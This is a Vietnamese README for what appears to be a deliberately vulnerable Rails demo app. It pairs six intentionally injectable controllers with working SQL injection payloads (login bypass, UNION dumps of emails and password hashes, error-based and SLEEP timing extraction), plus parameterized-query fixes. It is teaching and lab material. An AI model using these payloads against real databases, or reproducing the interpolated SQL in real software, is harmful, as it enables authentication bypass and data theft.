# 🚨 CÁC LỖ HỔNG SQL INJECTION TRONG ỨNG DỤNG

## 1. 🔥 CLASSIC SQLi - Login Bypass (CỰC KỲ NGUY HIỂM)

### File: `app/controllers/sessions_controller.rb` - Line 8-9

```ruby
# ❌ CODE VULNERABLE:
email = params[:email]
pass  = params[:password]
sql = "SELECT * FROM users WHERE email='#{email}' AND password_digest='#{pass}' LIMIT 1"
user = User.find_by_sql(sql).first
```

### 🎯 Cách khai thác:
```
Email: admin@example.com' OR '1'='1' --
Password: anything
```

### 💥 SQL được tạo ra:
```sql
SELECT * FROM users WHERE email='admin@example.com' OR '1'='1' --' AND password_digest='anything' LIMIT 1
```

### ⚠️ Nguy hiểm:
- **Bypass login hoàn toàn**
- **Không cần biết password**
- **Truy cập tài khoản bất kỳ**

---

## 2. 🔥 ERROR-BASED SQLi (NGUY HIỂM)

### File: `app/controllers/sqli_controller.rb` - Line 45

```ruby
# ❌ CODE VULNERABLE:
@sql_query = "SELECT * FROM users WHERE id = #{user_id}"
@users = User.find_by_sql(@sql_query)
```

### 🎯 Cách khai thác:
```
User ID: 1' AND (SELECT @@version)--
```

### 💥 SQL được tạo ra:
```sql
SELECT * FROM users WHERE id = 1' AND (SELECT @@version)--
```

### ⚠️ Nguy hiểm:
- **Lộ thông tin database version**
- **Lộ cấu trúc database**
- **Extract dữ liệu qua error messages**

---

## 3. 🔥 ERROR-BASED SQLi RAW (CỰC KỲ NGUY HIỂM)

### File: `app/controllers/sqli_controller.rb` - Line 14

```ruby
# ❌ CODE VULNERABLE:
@sql_query = "SELECT * FROM users WHERE id = #{user_id}"
connection = ActiveRecord::Base.connection
result = connection.execute(@sql_query)
```

### 🎯 Cách khai thác:
```
User ID: 1' AND (SELECT table_name FROM information_schema.tables LIMIT 1)--
```

### ⚠️ Nguy hiểm:
- **Raw SQL errors - không qua Rails filtering**
- **Lộ thông tin chi tiết nhất**
- **Bypass tất cả protection**

---

## 4. 🔥 UNION-BASED SQLi (CỰC KỲ NGUY HIỂM)

### File: `app/controllers/sqli_controller.rb` - Line 68

```ruby
# ❌ CODE VULNERABLE:
sql = "SELECT id, title, description FROM events WHERE title LIKE '%#{search_term}%'"
@events = Event.find_by_sql(sql)
```

### 🎯 Cách khai thác:
```
Search: ' UNION SELECT id,email,password_digest FROM users--
```

### 💥 SQL được tạo ra:
```sql
SELECT id, title, description FROM events WHERE title LIKE '%' UNION SELECT id,email,password_digest FROM users--%'
```

### ⚠️ Nguy hiểm:
- **Trích xuất toàn bộ database**
- **Lấy được password hash**
- **Xem dữ liệu tất cả bảng**

---

## 5. 🔥 BOOLEAN-BASED BLIND SQLi (NGUY HIỂM)

### File: `app/controllers/sqli_controller.rb` - Line 83

```ruby
# ❌ CODE VULNERABLE:
sql = "SELECT COUNT(*) as count FROM users WHERE email='#{email}'"
result = User.find_by_sql(sql).first
@exists = result.count > 0
```

### 🎯 Cách khai thác:
```
Email: admin@test.com' AND (SELECT SUBSTRING(database(),1,1))='s'--
```

### 💥 SQL được tạo ra:
```sql
SELECT COUNT(*) as count FROM users WHERE email='admin@test.com' AND (SELECT SUBSTRING(database(),1,1))='s'--'
```

### ⚠️ Nguy hiểm:
- **Đoán thông tin từng bit**
- **Khó phát hiện (không có error)**
- **Extract dữ liệu từ từ**

---

## 6. 🔥 TIME-BASED BLIND SQLi (CỰC KỲ NGUY HIỂM)

### File: `app/controllers/sqli_controller.rb` - Line 101

```ruby
# ❌ CODE VULNERABLE:
sql = "SELECT email FROM users WHERE email='#{email}' LIMIT 1"
result = User.find_by_sql(sql)
```

### 🎯 Cách khai thác:
```
Email: admin@test.com' AND IF((SELECT COUNT(*) FROM users WHERE role='admin')>0,SLEEP(3),0)--
```

### 💥 SQL được tạo ra:
```sql
SELECT email FROM users WHERE email='admin@test.com' AND IF((SELECT COUNT(*) FROM users WHERE role='admin')>0,SLEEP(3),0)--' LIMIT 1
```

### ⚠️ Nguy hiểm:
- **Hoàn toàn không để lại dấu vết**
- **Chỉ dựa vào thời gian phản hồi**
- **Có thể bypass mọi WAF**

---

## 🎯 TẤT CẢ PAYLOAD VULNERABLE

### A. Classic Login Bypass:
```
# Bypass với OR condition
Email: admin@example.com' OR '1'='1' --
Email: ' OR 1=1 #
Email: admin@example.com' OR 'x'='x' --

# Bypass với UNION
Email: ' UNION SELECT 1,'admin@test.com','password' --
```

### B. Error-based Extraction:
```
# Syntax errors
1'
1"
1')

# Version extraction
1 AND (SELECT @@version)
1' AND (SELECT @@version)--

# Database info
1 AND (SELECT database())
1 AND (SELECT user())

# Table extraction
1 AND (SELECT table_name FROM information_schema.tables LIMIT 1)
1 AND (SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema=database())

# Data extraction
1 AND (SELECT email FROM users LIMIT 1)
1 AND (SELECT GROUP_CONCAT(email) FROM users)
```

### C. Union-based Extraction:
```
# Determine columns
' UNION SELECT NULL--
' UNION SELECT NULL,NULL,NULL--

# Extract data
' UNION SELECT 1,@@version,database()--
' UNION SELECT id,email,password_digest FROM users--
' UNION SELECT 1,table_name,'table' FROM information_schema.tables--
```

### D. Boolean Blind:
```
# True/False testing
admin@test.com' OR '1'='1'--
admin@test.com' AND '1'='2'--

# Information extraction
admin@test.com' AND LENGTH(database())=20--
admin@test.com' AND SUBSTRING(database(),1,1)='s'--
admin@test.com' AND (SELECT COUNT(*) FROM users)>5--
```

### E. Time-based Blind:
```
# Basic delay testing
admin@test.com' AND IF(1=1,SLEEP(3),0)--
admin@test.com' AND IF(1=2,SLEEP(3),0)--

# Information extraction
admin@test.com' AND IF(LENGTH(database())=20,SLEEP(3),0)--
admin@test.com' AND IF(SUBSTRING(database(),1,1)='s',SLEEP(3),0)--
admin@test.com' AND IF((SELECT COUNT(*) FROM users WHERE role='admin')>0,SLEEP(3),0)--
```

---

## 🛡️ CÁCH FIX CÁC LỖ HỔNG

### 1. Fix Sessions Controller:
```ruby
# ✅ CÁCH AN TOÀN:
def create
  email = params[:email]
  password = params[:password]
  
  # Sử dụng parameterized query
  user = User.find_by(email: email)
  
  if user&.authenticate(password)
    session[:user_id] = user.id
    flash[:success] = "Login successful"
    redirect_to root_path
  else
    flash[:danger] = "Invalid credentials"
    redirect_to new_session_path
  end
end
```

### 2. Fix Error-based SQLi:
```ruby
# ✅ CÁCH AN TOÀN:
def error_based_demo
  user_id = params[:user_id]
  
  if user_id.present? && user_id.match?(/\A\d+\z/)  # Chỉ cho phép số
    @users = User.where(id: user_id)  # Sử dụng ActiveRecord
  end
end
```

### 3. Fix Union-based SQLi:
```ruby
# ✅ CÁCH AN TOÀN:
def union_demo
  search_term = params[:search]
  
  if search_term.present?
    # Sử dụng parameterized query
    @events = Event.where("title LIKE ?", "%#{search_term}%")
  end
end
```

### 4. Fix Blind SQLi:
```ruby
# ✅ CÁCH AN TOÀN:
def blind_demo
  email = params[:email]
  
  if email.present?
    # Sử dụng ActiveRecord thay vì raw SQL
    @exists = User.exists?(email: email)
  end
end
```

---

## 🚨 MỨC ĐỘ NGUY HIỂM

1. **Time-based Blind SQLi**: ⭐⭐⭐⭐⭐ - Không để lại dấu vết
2. **Union-based SQLi**: ⭐⭐⭐⭐⭐ - Trích xuất toàn bộ DB  
3. **Classic Login Bypass**: ⭐⭐⭐⭐⭐ - Bypass authentication
4. **Error-based Raw**: ⭐⭐⭐⭐ - Lộ thông tin chi tiết
5. **Boolean Blind**: ⭐⭐⭐⭐ - Khó phát hiện
6. **Error-based**: ⭐⭐⭐ - Có thể bị catch bởi Rails

## 📍 DEMO URLS

- **Classic SQLi**: http://localhost:3000/sessions/new
- **Error-based**: http://localhost:3000/sqli/error-based
- **Error Raw**: http://localhost:3000/sqli/error-raw  
- **Union-based**: http://localhost:3000/sqli/union
- **Boolean Blind**: http://localhost:3000/sqli/blind
- **Time-based**: http://localhost:3000/sqli/time-based

Tất cả các controller này đều VULNERABLE và có thể bị khai thác! 🔥
